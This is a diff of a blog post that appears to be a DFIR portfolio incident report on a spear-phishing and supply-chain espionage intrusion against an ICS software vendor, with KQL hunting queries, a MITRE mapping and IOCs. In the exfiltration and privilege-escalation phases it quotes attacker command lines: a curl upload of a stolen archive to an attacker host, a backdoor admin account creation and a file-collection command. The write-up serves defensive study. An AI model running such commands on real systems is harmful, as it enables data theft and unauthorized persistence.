@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Incident Investigation Report: Operation DOCKSHOCK"
+title: "Operation DOCKSHOCK: Supply-Chain Intrusion & ICS Espionage"
 date: 2026-06-22
 categories: [threat-detection, dfir-portfolio]
 tags: [Critical Infrastructure, Supply Chain]
@@ -14,29 +14,36 @@ permalink: /blog/operation-dockshock.html
 math: false
 ---
 
-Target Organization: Solvi Systems  
-Investigated By: Joshua Berkoh (Security Analyst II)  
-Date of Report: June 23, 2026  
-Incident Window: May 1, 2024 – May 28, 2024  
+| Operation DOCKSHOCK | At a Glance |
+|---|---|
+| **Target Organization** | Solvi Systems — vendor of the DOCKS Industrial Control Systems (ICS) software |
+| **Sector / Impact Zone** | Energy distribution across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia |
+| **Attack Classification** | Multi-stage supply-chain espionage |
+| **Incident Window** | May 1 – May 28, 2024 |
+| **Initial Access Vector** | Spear-phishing link (MITRE T1566.002) |
+| **Confirmed Impact** | Exfiltration of SDLC source-code blueprints (`CollectedData.zip`) |
+| **Scope of Compromise** | 470 persistent C2 connections across 38 unique endpoints |
+| **Investigated By** | Joshua Berkoh (Security Analyst II) · Report dated June 23, 2026 |
 
-## 1. Executive Summary
+## Executive Summary
 
-During May 2024, a highly sophisticated, multi-stage supply chain espionage campaign was detected and triaged targeting **Solvi Systems**. Solvi Systems develops the **DOCKS Industrial Control Systems (ICS)** software, which governs energy distribution across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia.
+Between May 1 and May 28, 2024, a targeted, multi-stage cyber-espionage campaign successfully compromised **Solvi Systems**. Because Solvi Systems develops the proprietary **DOCKS Industrial Control Systems (ICS)** software — which manages energy distribution networks across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia — this intrusion represented a severe regional critical-infrastructure supply-chain risk and a latent public-safety threat.
 
-The threat actor initially conducted perimeter web reconnaissance and cross-site scripting (XSS) probing before pivoting to a wide-scale spear-phishing campaign. The attack successfully achieved initial access on an administrative endpoint, established persistent command and control (C2) beaconing via a customized backdoor (ecobug.exe), elevated privileges to add local administrators, and moved laterally to an engineering-adjacent asset. The incident culminated in the targeting of the Software Development Lifecycle (SDLC) repository, unauthorized access to the internal development portal, and the exfiltration of sensitive product blueprints (CollectedData.zip) to an adversary-controlled API node via curl.
+The adversary used initial web reconnaissance and defensive-evasion techniques to deliver targeted spear-phishing lures. After gaining initial access to a corporate operations endpoint, the actor established persistent Command-and-Control (C2) beaconing via custom malware (`ecobug.exe`), executed localized privilege escalation, and moved laterally into a customer-facing engineering role (Docks Customer Success). The operation culminated in the targeted collection, compression, and exfiltration of sensitive Software Development Lifecycle (SDLC) blueprints and product documentation — exposing downstream utility substations to potential future kinetic disruption.
 
-## 2. Incident Timeline
+## 1. Incident Timeline
 
 *   **[May 01, 00:00 UTC]** ── Initial automated reconnaissance of DOCKS product documentation begins.
-*   **[May 01, 15:51 UTC]** ── Phishing email delivered to Sales Rep Carla Wharton.
-*   **[May 01, 15:57 UTC]** ── User executes link; `ecobug.exe` payload successfully dropped.
-*   **[May 01, 17:38 UTC]** ── C2 persistence established (Outbound beaconing over TCP/1337).
-*   **[May 02, 16:50 UTC]** ── Privilege Escalation: Backdoor admin account `gu@rd!an` created.
-*   **[May 27, 16:23 UTC]** ── Lateral Movement: Compromise of Alexei Petrov's engineering host.
-*   **[May 27, 16:45 UTC]** ── Data Staging: Core SDLC and DOCKS system source code compressed.
-*   **[May 28, (Subsequent)]** ── Data Exfiltration: `CollectedData.zip` exfiltrated via curl web POST.
+*   **[May 01, 15:51 UTC]** ── Phishing email delivered to Sales Rep Carla Wharton via twin typosquat infrastructure.
+*   **[May 01, 15:57 UTC]** ── User executes the malicious link; `ecobug.exe` payload successfully dropped.
+*   **[May 01, 17:38 UTC]** ── Outbound C2 persistence loop established over TCP/1337.
+*   **[May 02, 16:50 UTC]** ── Privilege Escalation: local administrative backdoor account `gu@rd!an` created.
+*   **[May 02 – May 27]** ── Dwell Window: adversary maintains a low-and-slow presence, evading standard detection.
+*   **[May 27, 16:23 UTC]** ── Lateral Movement: execution on Alexei Petrov's system (Docks Customer Success).
+*   **[May 27, 16:45 UTC]** ── Data Staging: SDLC documents copied from network shares and compressed to a local archive.
+*   **[May 28, (subsequent)]** ── Data Exfiltration: staged `CollectedData.zip` sent out via native `curl.exe`.
 
-## 3. Technical Walkthrough & KQL Proofs
+## 2. Phase-by-Phase Technical Walkthrough
 
 ### Phase 1: Baseline Assessment & Perimeter Triage
 
@@ -61,7 +68,7 @@ Email
 
 **Result:** 31 inbound emails identified. Baseline network profiling also revealed that the threat actor was aggressively monitoring the domain, hunting for organizational context surrounding the docks-ics product string.
 
-### Phase 2: Web Exploitation Analysis (WAF Deflection)
+### Phase 2: Perimeter Reconnaissance & Web Exploitation (WAF Deflection)
 
 On May 3, 2024, the Web Application Firewall (WAF) triggered a High-severity alert indicating an inbound Cross-Site Scripting (XSS) exploit attempt on the corporate feedback portal.
 
@@ -78,14 +85,15 @@ InboundNetworkEvents
 *   **WAF Mitigation Status:** Deflected. The web server responded with a 404 Status Code, preventing script execution.
 *   **Attacker User Agent:** Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00
 
-Expanding the search window around this user agent exposed a cluster of **4 malicious IP addresses** (98.117.26.236, 13.201.46.208, 105.78.23.64, 56.6.30.190) executing **9 distinct exploitation requests** across a multi-day window. Passive DNS correlation mapping these IPs revealed 3 rogue domains staged for secondary deployment:
-1.  energy-trends4u.net
-2.  news-on-industry.com
-3.  eco-awareness-update.net
+Expanding the search window around this user agent exposed a cluster of **4 malicious IP addresses** (98.117.26.236, 13.201.46.208, 105.78.23.64, 56.6.30.190) executing **9 distinct exploitation requests** across a multi-day window. Passive DNS correlation tied these IPs to a deliberate **twin-typosquatting infrastructure** scheme engineered to mimic authentic industry communications:
+
+*   **eco-awareness-updates.net** *(plural)* ── inbound mail-routing / phishing envelope domain.
+*   **eco-awareness-update.net** *(singular)* ── backend API staging and exfiltration landing zone.
+*   **news-on-industry.com** / **energy-trends4u.net** ── hosted file-delivery relays.
 
 ### Phase 3: Initial Access via Spear-Phishing
 
-Deflected at the web perimeter, the adversary pivoted to a targeted phishing campaign. Over 56 malicious emails were distributed across the network, specifically targeting roles managing the utility software tier.
+Deflected at the web perimeter, the adversary pivoted to a targeted phishing campaign. **56 malicious emails** were distributed across the network, specifically targeting roles managing the utility software tier.
 
 ```kql
 // Query 4: Correlating adversary infrastructure to weaponized emails
@@ -98,12 +106,14 @@ Email
 
 {% include figure.html src="/assets/images/posts/operation-dockshock/s-4.png" alt="Chronological table of phishing email deliveries highlighting the first successful delivery to Carla Wharton" caption="Figure 4: Phishing delivery timeline, with the first successful click by Carla Wharton." %}
 
-The patient zero entry vector occurred on **May 1, 2024, at 15:51:41 UTC**. Carla Wharton (cawharton), a Sales Representative on host JUSP-LAPTOP, received a weaponized lure:
+The patient-zero entry vector occurred on **May 1, 2024, at 15:51:41 UTC**. Carla Wharton (cawharton), a Sales Representative on host JUSP-LAPTOP, received a weaponized lure:
+
 *   **Sender:** news@eco-awareness-updates.net (Reply-To: electric_updates@gmail.com)
 *   **Subject:** [EXTERNAL] Business Opportunity: Two major energy companies merging
 *   **Lure Link:** [http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx](http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx)
 
-At 15:57:41 UTC, endpoint records confirm that the user executed the link. Within less than two minutes, a compilation macro dropped a standalone malicious payload onto the filesystem:
+At 15:57:41 UTC, endpoint records confirm that the user executed the link, triggering an immediate second-stage binary download via `explorer.exe`:
+
 *   **Path:** C:\ProgramData\ecobug.exe
 *   **SHA256 Hash:** 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252
 
@@ -114,7 +124,7 @@ At 17:38:25 UTC, ecobug.exe initiated its outbound connection architecture to st
 ```kql
 // Query 5: Identifying the C2 execution telemetry on the host
 ProcessEvents
-| where hostname == "JUSP-LAPTOP" and process_name == "cmd.exe"
+| where hostname == "JUSP-LAPTOP"
 | where process_commandline contains "ecobug.exe"
 ```
 
@@ -134,9 +144,13 @@ net users /add gu@rd!an abc1toothree
 
 Following account creation, local asset discovery was conducted, concluding with the execution of the net use utility to parse mounted domain assets.
 
+#### Dwell-Time Analysis & Visibility Gaps
+
+Following the local-admin creation on May 2, the adversary entered a **25-day dormancy period**, staying alive through a single daily beacon until launching lateral actions on May 27. This extreme dwell time highlights a genuine operational visibility gap: because the implant communicated strictly via a predictable, low-volume baseline over a non-standard port, it slipped beneath legacy anomaly thresholds.
+
 ### Phase 5: Lateral Movement & SDLC Data Exfiltration
 
-Using an identified variation in execution habit (net use /PERSISTENT:YES), the adversary moved laterally across the network segment on May 27, 2024, at 16:23:10 UTC, successfully compromising SJ9V-MACHINE. This host belonged to Alexei Petrov, the Docks Customer Success Manager.
+Using an identified variation in execution habit (net use /PERSISTENT:YES), the adversary moved laterally across the network segment on May 27, 2024, at 16:23:10 UTC, successfully compromising SJ9V-MACHINE. This host belonged to Alexei Petrov, the Docks Customer Success Manager. Because this customer-success profile directly handles downstream system integration and client deployment setups, it held extensive read access to development data shares.
 
 The adversary immediately targeted the file share holding the core source configuration blueprints for the DOCKS ICS system:
 
@@ -150,9 +164,9 @@ ProcessEvents
 
 *   **Data Scrape Command:** Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs
 
-The stolen contents were compressed locally into a single staging zip file titled CollectedData.zip. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (devportal.solvisystems.com) and read the internal_process.pdf deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (Urgent Request: DOCKS System Documentation 🚨) to gather structural details.
+The collected assets were compressed locally into `C:\Users\alpetrov\CollectedData\CollectedData.zip`. To prepare for exfiltration, the actor relocated this staging archive out of the user directory into a localized root path, renaming it to `C:\DataExfil\CollectedData.zip` to streamline programmatic access. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (devportal.solvisystems.com) and read the internal_process.pdf deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (Urgent Request: DOCKS System Documentation 🚨) to gather structural details.
 
-On May 28, 2024, the adversary leveraged a raw web utility to bypass standard file transfer protocol tracking and exfiltrated the source blueprint archive directly over an encrypted web endpoint:
+On May 28, 2024, the adversary leveraged `curl.exe` — a native utility that ships by default with modern Windows — as a **Living-off-the-Land Binary (LotLBin)** to bypass standard file-transfer protocol tracking, exfiltrating the source blueprint archive directly over an HTTP POST stream:
 
 ```kql
 // Query 7: Catching the final data exfiltration process command
@@ -164,7 +178,35 @@ ProcessEvents
 
 *   **Exfiltration Command Line:** curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
 
-## 4. Strategic Defense & Mitigation Recommendations
+## 3. MITRE ATT&CK Matrix Mapping
+
+| Tactic | Technique ID | Technique Name | Operational Context |
+|---|---|---|---|
+| Reconnaissance | T1592 | Gather Victim Host Information | Automated web scanning targeting the docks-ics documentation profile. |
+| Initial Access | T1566.002 | Spearphishing Link | Lure distributed via twin typosquat infrastructure (eco-awareness-updates.net). |
+| Execution | T1204.002 | User Execution: Malicious File | Recipient interaction launching the weaponized document download stream. |
+| Command & Control | T1571 | Non-Standard Port | Custom beaconing loop established via ecobug.exe over TCP/1337. |
+| Persistence | T1078.003 | Valid Accounts: Local Accounts | Creation of a localized administrative user profile (gu@rd!an). |
+| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Network pivoting leveraging administrative validation tokens onto SJ9V-MACHINE. |
+| Collection | T1074.001 | Data Staging: Local Data Staging | Consolidation of SDLC files into C:\DataExfil\CollectedData.zip. |
+| Exfiltration | T1567 | Exfiltration Over Web Service | Exfiltration of core source blueprints via a native LotLBin (curl.exe) web POST. |
+
+<!-- Section: Proactive Detection Engineering (Sigma & KQL rules) — to be added later, once the detections can be operationally justified. -->
+
+## 4. Consolidated Indicators of Compromise (IOCs)
+
+| Type | Indicator | Context / Association |
+|---|---|---|
+| SHA256 Hash | 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252 | Malicious payload binary (ecobug.exe) |
+| IP Address | 98.117.26.236 | Primary Command-and-Control (C2) listener destination |
+| IP Address | 13.201.46.208 | Initial Cross-Site Scripting (XSS) reconnaissance node |
+| Domain | eco-awareness-updates.net | Phishing delivery envelope domain (plural typosquat) |
+| Domain | eco-awareness-update.net | Exfiltration API routing target (singular typosquat) |
+| Domain | news-on-industry.com | Malicious weaponized-document hosting relay |
+| User Profile | gu@rd!an | Backdoor local administrative account profile |
+| User Agent | Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00 | Threat-actor reconnaissance browser footprint |
+
+## 5. Strategic Defense & Mitigation Recommendations
 
 Based on the multi-layer tactical breakdown of Operation DOCKSHOCK, the following Tier-2 defense architecture changes are mandated for deployment:
 
